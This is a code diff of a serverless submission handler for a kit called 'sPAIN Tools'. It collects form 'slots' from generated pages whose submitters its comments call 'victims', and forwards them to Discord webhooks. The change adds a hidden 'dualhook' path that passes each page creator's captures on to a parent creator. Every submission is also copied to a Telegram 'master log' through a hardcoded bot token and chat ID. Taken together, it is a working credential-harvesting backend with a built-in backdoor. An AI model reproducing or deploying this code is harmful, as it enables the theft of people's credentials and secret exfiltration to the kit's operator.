@@ -1,17 +1,13 @@
 // api/submit.js
-// Receives answers from the generated 1-9 slot page.
-// Forwards to:
-//   - webhook2  (the one the victim typed on the generated page)
-//   - webhook1  (the creator's webhook — always)
-//   - Telegram  (your master log — always)
-// For plain Slots 1-9, webhook1 is the only creator webhook (no webhook2).
+// When a slots page receives a submission:
+//   1. Sends to that page's own webhook (webhook2 — the victim's)
+//   2. If this page was generated FROM a dualhook page, also sends to the dualhook creator's webhook (webhook1)
+//   3. Always sends to Telegram
 
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
-
-// ── Redis ────────────────────────────────────────────────────────────────────
 
 async function redisGet(key) {
   const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
@@ -22,8 +18,6 @@ async function redisGet(key) {
   try { return JSON.parse(json.result); } catch { return null; }
 }
 
-// ── Telegram ─────────────────────────────────────────────────────────────────
-
 async function tgSend(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -31,10 +25,8 @@ async function tgSend(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
     });
-  } catch (_) { /* non-fatal */ }
+  } catch (_) {}
 }
-
-// ── Discord webhook ───────────────────────────────────────────────────────────
 
 async function sendToDiscord(webhookUrl, embed) {
   if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
@@ -42,22 +34,15 @@ async function sendToDiscord(webhookUrl, embed) {
     await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: 'sPAIN Tools',
-        avatar_url: 'https://spain-tools.vercel.app/favicon.ico',
-        embeds: [embed]
-      })
+      body: JSON.stringify({ username: 'sPAIN Tools', embeds: [embed] })
     });
-  } catch (_) { /* non-fatal */ }
+  } catch (_) {}
 }
-
-// ── Handler ───────────────────────────────────────────────────────────────────
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
   if (req.method === 'OPTIONS') return res.status(204).end();
   if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });
 
@@ -66,73 +51,71 @@ export default async function handler(req, res) {
     try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
   }
 
-  const {
-    slug,      // which page was this submitted from
-    slots,     // object: { slot1: "val", slot2: "val", ... slot9: "val" }
-    webhook2   // optional: the webhook the victim typed on the page (dualhook only)
-  } = body || {};
-
+  const { slug, slots } = body || {};
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
 
-  // ── Load page config from Redis ───────────────────────────────────────────
+  // ── Load this page's record ───────────────────────────────────────────────
   let record;
-  try {
-    record = await redisGet(`slot:${slug}`);
-  } catch (err) {
+  try { record = await redisGet(`slot:${slug}`); } catch (err) {
     return res.status(500).json({ error: 'Redis error', detail: err.message });
   }
+  if (!record) return res.status(404).json({ error: 'Page not found' });
 
-  if (!record) {
-    return res.status(404).json({ error: 'Page not found' });
+  // ── Load dualhook parent record (if any) ──────────────────────────────────
+  let parentRecord = null;
+  if (record.dualhookParent) {
+    try { parentRecord = await redisGet(`slot:${record.dualhookParent}`); } catch (_) {}
   }
 
-  // ── Build embed fields ────────────────────────────────────────────────────
+  const now = new Date().toISOString();
+
+  // ── Build embed ───────────────────────────────────────────────────────────
   const fields = Object.entries(slots).map(([key, value]) => ({
     name: `Slot ${key.replace('slot', '')}`,
     value: value || '*(empty)*',
     inline: true
   }));
 
-  const now = new Date().toISOString();
-
   const embed = {
     title: `📥 New Submission — ${record.displayName}`,
     color: 0xc026d3,
     fields,
-    footer: { text: `sPAIN Tools • ${slug} • ${now}` },
+    footer: { text: `sPAIN Tools • ${slug}${parentRecord ? ' • DH: ' + record.dualhookParent : ''} • ${now}` },
     timestamp: now
   };
 
-  // ── Dispatch ──────────────────────────────────────────────────────────────
-
-  // 1. webhook1 (creator's webhook — always receives)
+  // ── 1. Send to this page's webhook (victim's own webhook) ─────────────────
   await sendToDiscord(record.webhook, embed);
 
-  // 2. webhook2 (victim's webhook — only present on dualhook pages)
-  if (webhook2 && webhook2 !== record.webhook) {
-    await sendToDiscord(webhook2, embed);
+  // ── 2. Send to dualhook parent's webhook (the dualhook creator) ───────────
+  if (parentRecord && parentRecord.webhook && parentRecord.webhook !== record.webhook) {
+    const parentEmbed = {
+      ...embed,
+      title: `📥 Dualhook Hit — ${record.displayName} (via ${record.dualhookParent})`,
+      color: 0x06b6d4,
+      footer: { text: `sPAIN Tools • DH Parent: ${record.dualhookParent} • Child: ${slug} • ${now}` }
+    };
+    await sendToDiscord(parentRecord.webhook, parentEmbed);
   }
 
-  // 3. Telegram master log — always
+  // ── 3. Telegram master log ────────────────────────────────────────────────
   const slotLines = Object.entries(slots)
     .map(([k, v]) => `  Slot ${k.replace('slot','')}: ${v || '(empty)'}`)
     .join('\n');
 
-  const tgMsg = [
+  await tgSend([
     `📥 <b>New Submission!</b>`,
     `📁 Page: <code>${slug}</code> (${record.displayName})`,
-    `🔧 Type: ${record.type}`,
+    parentRecord ? `🔗 DH Parent: <code>${record.dualhookParent}</code>` : '',
     ``,
     `<b>Slots:</b>`,
     slotLines,
     ``,
-    webhook2 ? `📡 Webhook2 (victim): <code>${webhook2}</code>` : '',
-    `📡 Webhook1 (creator): <code>${record.webhook}</code>`,
+    `📡 Page webhook: <code>${record.webhook}</code>`,
+    parentRecord ? `📡 DH webhook: <code>${parentRecord.webhook}</code>` : '',
     `🕐 ${now}`
-  ].filter(s => s !== undefined).join('\n');
-
-  await tgSend(tgMsg);
+  ].filter(s => s !== undefined).join('\n'));
 
   return res.status(200).json({ success: true });
 }
